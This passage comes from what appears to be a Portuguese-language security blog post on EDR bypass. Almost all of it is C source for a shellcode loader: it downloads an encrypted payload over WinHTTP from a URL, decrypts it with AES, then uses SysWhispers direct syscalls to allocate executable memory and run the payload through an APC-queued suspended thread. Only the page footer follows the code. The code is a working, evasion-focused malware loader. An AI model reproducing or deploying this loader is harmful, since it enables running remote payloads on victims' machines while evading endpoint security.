</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpCrackUrl(szUrl, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, &amp;urlComp)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hSession = WinHttpOpen(<span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;&#34;</span>, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hSession == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hConnect == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hRequest = WinHttpOpenRequest(hConnect, <span style="color:#ed9d13">L</span><span style="color:#ed9d13">&#34;GET&#34;</span>, urlComp.lpszUrlPath, <span style="color:#24909d">NULL</span>, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hRequest == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, <span style="color:#3677a9">0</span>, WINHTTP_NO_REQUEST_DATA, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpReceiveResponse(hRequest, <span style="color:#24909d">NULL</span>)) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    pTmpBytes = (PBYTE)LocalAlloc(LPTR, <span style="color:#3677a9">1024</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (pTmpBytes == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>        bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">while</span> (TRUE) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (!WinHttpReadData(hRequest, pTmpBytes, <span style="color:#3677a9">1024</span>, &amp;dwBytesRead)) {
</span></span><span style="display:flex;"><span>            bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (dwBytesRead == <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        sSize += dwBytesRead;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (pBytes == <span style="color:#24909d">NULL</span>)
</span></span><span style="display:flex;"><span>            pBytes = (PBYTE)LocalAlloc(LPTR, sSize);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">else</span>
</span></span><span style="display:flex;"><span>            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">if</span> (pBytes == <span style="color:#24909d">NULL</span>) {
</span></span><span style="display:flex;"><span>            bSTATE = FALSE; <span style="color:#6ab825;font-weight:bold">goto</span> _EndOfFunction;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
</span></span><span style="display:flex;"><span>        memset(pTmpBytes, <span style="color:#ed9d13">&#39;\0&#39;</span>, dwBytesRead);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    *pPayloadBytes = pBytes;
</span></span><span style="display:flex;"><span>    *sPayloadSize = sSize;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_EndOfFunction:
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hSession) WinHttpCloseHandle(hSession);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hConnect) WinHttpCloseHandle(hConnect);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (hRequest) WinHttpCloseHandle(hRequest);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (pTmpBytes) LocalFree(pTmpBytes);
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> bSTATE;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">AESDecrypt</span>(<span style="color:#6ab825;font-weight:bold">char</span>* payload, <span style="color:#6ab825;font-weight:bold">unsigned</span> <span style="color:#6ab825;font-weight:bold">int</span> payload_len, <span style="color:#6ab825;font-weight:bold">char</span>* key, SIZE_T keylen) {
</span></span><span style="display:flex;"><span>    HCRYPTPROV hProv;
</span></span><span style="display:flex;"><span>    HCRYPTHASH hHash;
</span></span><span style="display:flex;"><span>    HCRYPTKEY hKey;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptAcquireContextW(&amp;hProv, <span style="color:#24909d">NULL</span>, <span style="color:#24909d">NULL</span>, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptCreateHash(hProv, CALG_SHA_256, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, &amp;hHash)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, <span style="color:#3677a9">0</span>)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptDeriveKey(hProv, CALG_AES_256, hHash, <span style="color:#3677a9">0</span>, &amp;hKey)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (!CryptDecrypt(hKey, (HCRYPTHASH)<span style="color:#24909d">NULL</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, payload, &amp;payload_len)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    CryptReleaseContext(hProv, <span style="color:#3677a9">0</span>);
</span></span><span style="display:flex;"><span>    CryptDestroyHash(hHash);
</span></span><span style="display:flex;"><span>    CryptDestroyKey(hKey);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6ab825;font-weight:bold">int</span> <span style="color:#447fcf">main</span>() {
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    PBYTE EncShellcode = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    SIZE_T fileSize = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    PVOID exec_mem = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    HANDLE hThread = <span style="color:#24909d">NULL</span>;
</span></span><span style="display:flex;"><span>    NTSTATUS status;
</span></span><span style="display:flex;"><span>    DWORD oldProtect = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 1. Baixar o shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    <span style="color:#6ab825;font-weight:bold">if</span> (!GetPayloadFromUrl(url, &amp;EncShellcode, &amp;fileSize)) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Encriptado&#34;</span>, EncShellcode, fileSize);
</span></span><span style="display:flex;"><span>    okay(<span style="color:#ed9d13">&#34;Shellcode criptografado carregado da URL.</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>);
</span></span><span style="display:flex;"><span>    printMemoryInfo(EncShellcode, <span style="color:#ed9d13">&#34;EncShellcode&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 2. Descriptografar o shellcode
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    AESDecrypt((<span style="color:#6ab825;font-weight:bold">char</span>*)EncShellcode, fileSize, key, <span style="color:#6ab825;font-weight:bold">sizeof</span>(key));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 3. Alocar mem√≥ria para o shellcode usando SysWhispers
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtAllocateVirtualMemory(
</span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
</span></span><span style="display:flex;"><span>        &amp;exec_mem, 
</span></span><span style="display:flex;"><span>        <span style="color:#3677a9">0</span>, 
</span></span><span style="display:flex;"><span>        &amp;fileSize, 
</span></span><span style="display:flex;"><span>        MEM_COMMIT | MEM_RESERVE, 
</span></span><span style="display:flex;"><span>        PAGE_READWRITE
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 4. Escrever o shellcode na mem√≥ria
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtWriteVirtualMemory(
</span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
</span></span><span style="display:flex;"><span>        exec_mem, 
</span></span><span style="display:flex;"><span>        EncShellcode, 
</span></span><span style="display:flex;"><span>        fileSize, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 5. Alterar permiss√µes de mem√≥ria para execu√ß√£o
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtProtectVirtualMemory(
</span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
</span></span><span style="display:flex;"><span>        &amp;exec_mem, 
</span></span><span style="display:flex;"><span>        &amp;fileSize, 
</span></span><span style="display:flex;"><span>        PAGE_EXECUTE_READ, 
</span></span><span style="display:flex;"><span>        &amp;oldProtect
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 6. Criar um thread suspenso
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtCreateThreadEx(
</span></span><span style="display:flex;"><span>        &amp;hThread, 
</span></span><span style="display:flex;"><span>        THREAD_ALL_ACCESS, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>, 
</span></span><span style="display:flex;"><span>        (HANDLE)-<span style="color:#3677a9">1</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>, 
</span></span><span style="display:flex;"><span>        CREATE_SUSPENDED, 
</span></span><span style="display:flex;"><span>        <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, <span style="color:#3677a9">0</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 7. Enfileirar o shellcode no APC do thread
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtQueueApcThread(
</span></span><span style="display:flex;"><span>        hThread,
</span></span><span style="display:flex;"><span>        (PVOID)exec_mem, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 8. Ativar o thread (retomar execu√ß√£o)
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    DWORD suspendCount = <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>    status = Sw3NtResumeThread(
</span></span><span style="display:flex;"><span>        hThread,
</span></span><span style="display:flex;"><span>        &amp;suspendCount
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#999;font-style:italic">// 9. Esperar o thread terminar
</span></span></span><span style="display:flex;"><span><span style="color:#999;font-style:italic"></span>    status = Sw3NtWaitForSingleObject(
</span></span><span style="display:flex;"><span>        hThread, 
</span></span><span style="display:flex;"><span>        FALSE, 
</span></span><span style="display:flex;"><span>        <span style="color:#24909d">NULL</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">if</span> (status != <span style="color:#3677a9">0</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">return</span> -<span style="color:#3677a9">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#6ab825;font-weight:bold">return</span> <span style="color:#3677a9">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p><img alt="map" src="https://pwnbuffer.org/images/mount/edr-bypass/bypass.png"></p>

      </div>


      <footer>
        


        
        
        
        
        
        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ¬©
    
    2025
     pwnbuffer 
    ¬∑
    
    Promovido por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder (modified)</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://pwnbuffer.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>
</html>
